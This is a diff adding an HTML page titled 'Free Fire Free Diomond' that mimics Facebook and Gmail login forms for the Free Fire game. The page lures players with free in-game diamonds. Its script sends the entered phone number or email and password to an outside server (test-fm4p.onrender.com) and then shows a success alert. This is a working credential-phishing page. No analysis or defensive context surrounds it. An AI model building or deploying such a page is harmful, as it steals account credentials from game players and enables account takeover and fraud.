@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Fire Free Diomond</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Lora:ital,wght@0,400..700;1,400..700&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap');
+
+    body {
+      background-image: url(./free-fire-banner-with-complete-cast-5vfv6tj9bc7x37rw.jpg);
+      font-family: 'Roboto', sans-serif;
+    }
+
+    h1 {
+      font-family: 'Poppins', sans-serif;
+      /* Heading font */
+    }
+
+    p {
+      font-family: 'Lora', serif;
+      /* Paragraph font */
+    }
+
+    .label-main {
+      font-size: 16px;
+      margin-bottom: 5px;
+      color: #fff;
+    }
+
+    .needs {
+      color: #ffff;
+      font-size: 24px;
+      text-align: center;
+      margin-top: -6px;
+    }
+
+    .input-feild {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      background-color: #8885856b;
+      color: #ffff;
+      outline: none;
+    }
+
+    .message-field {
+      width: 100%;
+      height: 100px;
+    }
+
+    .new-btn {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .close-btn {
+      background-color: #f44336;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .main-form {
+      width: 443px;
+      height: auto;
+      padding: 26px 12px;
+      background-color: #05050593;
+      box-sizing: border-box;
+      border-radius: 10px;
+      margin: 44px auto;
+    }
+
+    .main-form form {
+      width: 400px;
+    }
+
+
+
+    .tabs {
+      margin-bottom: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 0 auto;
+
+    }
+
+    .tab-button {
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      flex: 1;
+      text-align: center;
+    }
+
+    .tab-button.active {
+      background: transparent;
+    }
+
+    .tab-content {
+      display: none;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    .imds {
+      width: 60px;
+    }
+
+    @media only screen and (max-width: 600px) {
+      .tabs {
+        margin-bottom: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 0 auto;
+
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="tabs">
+    <button style="background: transparent;" class="tab-button active" onclick="openTab(event, 'home')"><img
+        class="imds" src="./facebook.png" alt=""></button>
+    <button style="background: transparent;" class="tab-button" onclick="openTab(event, 'about')"><img class="imds"
+        src="./google.png" alt=""></button>
+  </div>
+
+  <div id="home" class="tab-content active">
+    <div id="inquiryFormModal" class="main-form">
+      <h3 class="needs">Facebook Acount In Free Fire</h3>
+      <form id="inquiryForm">
+
+        <label class="label-main" for="email">Mobile no:</label><br />
+        <input class="input-feild" type="email" id="email" name="email" required /><br /><br />
+
+        <label class="label-main" for="mobile">Password:</label><br />
+        <input class="input-feild" type="tel" id="mobile" name="mobile" required /><br /><br />
+
+        <button type="submit" class="new-btn">Sign In</button>
+        <!-- Close Button inside Modal -->
+      </form>
+    </div>
+  </div>
+  <div id="about" class="tab-content">
+    <div id="inquiryFormModal" class="main-form">
+      <h3 class="needs">Gmail Acount In Free Fire</h3>
+      <form id="inquiryForm">
+
+        <label class="label-main" for="email">Email Id:</label><br />
+        <input class="input-feild" type="email" id="email" name="email" required /><br /><br />
+
+        <label class="label-main" for="mobile">Password:</label><br />
+        <input class="input-feild" type="tel" id="mobile" name="mobile" required /><br /><br />
+
+
+
+        <button type="submit" class="new-btn">Sign In</button>
+        <!-- Close Button inside Modal -->
+      </form>
+    </div>
+  </div>
+
+
+
+
+  <script>
+    // Form submission using fetch API
+    document.getElementById('inquiryForm').addEventListener('submit', function (e) {
+      e.preventDefault();  // Prevent default form submission
+
+      const formData = new FormData(this);
+      const data = new URLSearchParams(formData).toString();
+
+      fetch('https://test-fm4p.onrender.com/submit-form', {
+        method: 'POST',
+        body: data,
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        }
+      })
+        .then(response => response.text())
+        .then(result => {
+          alert('Form submitted successfully');
+          console.log(result);
+        })
+        .catch(error => {
+          alert('Error submitting form');
+          console.error(error);
+        });
+    });
+
+
+    // ====TAB======//
+    function openTab(evt, tabName) {
+      // Hide all tab content
+      var content = document.querySelectorAll(".tab-content");
+      content.forEach(function (item) {
+        item.classList.remove("active");
+      });
+
+      // Remove "active" class from all buttons
+      var buttons = document.querySelectorAll(".tab-button");
+      buttons.forEach(function (item) {
+        item.classList.remove("active");
+      });
+
+      // Show the clicked tab's content
+      document.getElementById(tabName).classList.add("active");
+
+      // Add "active" class to the clicked button
+      evt.currentTarget.classList.add("active");
+    }
+
+  </script>
+</body>
+
+</html>
